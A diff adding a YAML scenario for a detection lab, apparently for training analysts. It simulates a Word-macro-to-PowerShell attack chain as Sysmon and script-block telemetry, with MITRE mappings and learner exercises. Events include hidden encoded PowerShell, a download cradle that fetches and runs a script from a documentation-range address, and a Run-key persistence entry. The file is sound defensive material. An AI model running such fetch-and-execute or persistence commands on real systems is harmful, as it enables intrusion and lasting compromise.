@@ -1,0 +1,108 @@
+slug: suspicious-powershell-simulation
+name: Suspicious PowerShell simulation
+description: >
+  A simulated user-execution chain on one workstation: a document launches PowerShell, which uses
+  an encoded command and a download cradle, decodes a second stage in memory and writes a Run key.
+  Every string is harmless and every address is from a documentation range; only the telemetry
+  shape is realistic.
+source_type: Sysmon EID 1 and 13 plus PowerShell script-block logging (4104)
+difficulty: intermediate
+mitre: [T1059.001, T1027.010, T1105, T1547.001, T1204.002]
+expected_rules:
+  - win-encoded-powershell-command
+  - win-powershell-download-cradle
+  - win-powershell-scriptblock-decode-execute
+  - win-run-key-persistence-set
+  - win-office-application-spawns-shell
+try_this:
+  - Which two rules look at the same PowerShell activity from different log sources? Why keep both?
+  - "The encoded command decodes to a harmless message. Decode it yourself: what encoding is used?"
+  - Take out the `-w hidden` flag from the events. Do any rules stop matching?
+events:
+  # Ordinary PowerShell administration for comparison
+  - t: 0
+    repeat: 8
+    every: 600
+    category: process_creation
+    host: WKS-031
+    user: 'CORP\admin.kim'
+    fields:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      OriginalFileName: PowerShell.EXE
+      ParentImage: 'C:\Windows\explorer.exe'
+      CommandLine: 'powershell.exe Get-Service | Where-Object Status -eq Running'
+      IntegrityLevel: High
+    note: Interactive administration. None of these should alert.
+  - t: 20
+    repeat: 3
+    every: 1500
+    category: process_creation
+    host: WKS-031
+    user: 'CORP\admin.kim'
+    fields:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      OriginalFileName: PowerShell.EXE
+      ParentImage: 'C:\Windows\CCM\CcmExec.exe'
+      CommandLine: 'powershell.exe -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgB2AGUAbgB0AG8AcgB5ACcA '
+      IntegrityLevel: System
+    note: Encoded PowerShell started by the endpoint-management agent. The rule's filter excludes it.
+
+  # The chain
+  - t: 2000
+    category: process_creation
+    host: WKS-031
+    user: 'CORP\jlee'
+    fields:
+      Image: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+      ParentImage: 'C:\Windows\explorer.exe'
+      CommandLine: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "C:\Users\jlee\Downloads\Purchase-Order.docm"'
+      IntegrityLevel: Medium
+    note: The user opens a macro-enabled attachment.
+  - t: 2011
+    category: process_creation
+    host: WKS-031
+    user: 'CORP\jlee'
+    fields:
+      Image: 'C:\Windows\System32\cmd.exe'
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+      CommandLine: 'cmd.exe /c powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBiACAAcwBpAG0AdQBsAGEAdABpAG8AbgAnAA== '
+      IntegrityLevel: Medium
+    note: Word starts a command shell.
+  - t: 2012
+    category: process_creation
+    host: WKS-031
+    user: 'CORP\jlee'
+    fields:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      OriginalFileName: PowerShell.EXE
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBiACAAcwBpAG0AdQBsAGEAdABpAG8AbgAnAA== '
+      IntegrityLevel: Medium
+    note: Hidden, encoded PowerShell. The Base64 decodes (UTF-16LE) to a harmless Write-Output line.
+  - t: 2020
+    category: process_creation
+    host: WKS-031
+    user: 'CORP\jlee'
+    fields:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      OriginalFileName: PowerShell.EXE
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'powershell.exe -nop -c "IEX ((New-Object Net.WebClient).DownloadString(''http://198.51.100.10/stage2.ps1''))"'
+      IntegrityLevel: Medium
+    note: A download cradle. The address is in a documentation range; nothing is fetched.
+  - t: 2022
+    category: ps_script
+    host: WKS-031
+    user: 'CORP\jlee'
+    fields:
+      ScriptBlockText: "$blob = [Convert]::FromBase64String('Q3liZXJGb3JnZSBsYWIgc2ltdWxhdGlvbiAtIGhhcm1sZXNz'); Invoke-Expression ([Text.Encoding]::UTF8.GetString($blob))"
+    note: Script-block logging records the decoded logic even though the command line was encoded.
+  - t: 2100
+    category: registry_set
+    host: WKS-031
+    user: 'CORP\jlee'
+    fields:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      TargetObject: 'HKU\S-1-5-21-2000\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync'
+      Details: 'powershell.exe -w hidden -File C:\Users\jlee\AppData\Roaming\sync.ps1'
+    note: "Persistence: a Run key that relaunches the script at every logon."
